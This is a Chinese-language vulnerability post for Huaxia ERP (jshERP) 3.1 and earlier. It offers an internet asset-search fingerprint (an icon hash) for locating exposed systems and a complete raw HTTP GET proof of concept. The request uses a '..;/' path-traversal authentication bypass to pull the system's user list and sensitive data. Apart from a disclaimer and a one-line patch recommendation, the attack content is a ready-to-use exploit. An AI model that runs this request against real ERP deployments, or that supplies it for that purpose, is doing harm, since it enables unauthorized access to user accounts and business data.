#  华夏ERP敏感信息泄露漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-03-10 03:26  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
# 华夏ERP敏感信息泄露漏洞  
#   
  
02  
  
—  
  
影响版本  
  
影  
响版本  
：  
华夏ERP3.1及之前版本(部分v3.0、v3.2、v3.3等版本也可能受影响）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS0zMdknb4UuGjlf7njhJZdCVjgKJEkLwIngAMkE2aHFMyh0IxiaAg8hJxD1UgcpUv9UxxaBKfGORquVTLMs1m9HGrw6CiavT0kCs/640?wx_fmt=png&from=appmsg "")  
  
****  
  
03  
  
—  
  
漏洞简介  
  
华夏ERP（现名管伊佳ERP）是一款面向中小企业的开源ERP系统，核心功能涵盖进销存、财务  
及生产管理，  
支持多设备同步与角色权限精细控制。  
华夏ERP以开源、  
灵活、功能全面的特点，为中小企业提供了高性价比的ERP解决方案，助力企业实现数字化转  
型  
。  
攻击者可通过构造特定请求（如访问/jsherp-boot/user/getalllist  
接口），绕过正常权限限制，直接获取系统用户列表及敏感信息。  
  
04  
  
—  
  
资产测绘  
```
icon_hash=="-1298131932"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS0M2AI46YSpqsVxL0MP2O1SwLzzic9HCichBQAk3yFcibib5WnYZm31X02LibSwVYSLv92kahsrfj2tTF3oDQ9H2EOHXnPgl53FuA6o/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
GET /jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/getAllList HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS1PJTFZcUlrTFjSk1BAPhibB8P0liaibsVhsoHalszUlI0d3BQMcKCNNThxSV1oGmaskyE5KHadpaTEbuYzoGWZbe3UBnWxpcEzcI/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS2VkK7IfByVS7888s4E6kvL2IpicJaq9Zg06dJtbFP7tKe1rQYficoGZXzcGCUoCUrxK9nKY2y5v7WWibwYknlXiaSGEJ2HibAPHf0U/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS2BHXEN7AemvbmpCVia0xnTBoBDo7ch71Y12dBJNtfBiaMr8Yqztrj8wdIFKoFjyUOOzsicqBx5AOicL1eW6fZTtJYcrRZIaPDBeB8/640?wx_fmt=png&from=appmsg "")  
  
06  
  
—  
  
修复建议  
  
  
建议联系华夏E  
R  
P  
厂商获取最新安全补丁，及时更新系统版本  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
  
  
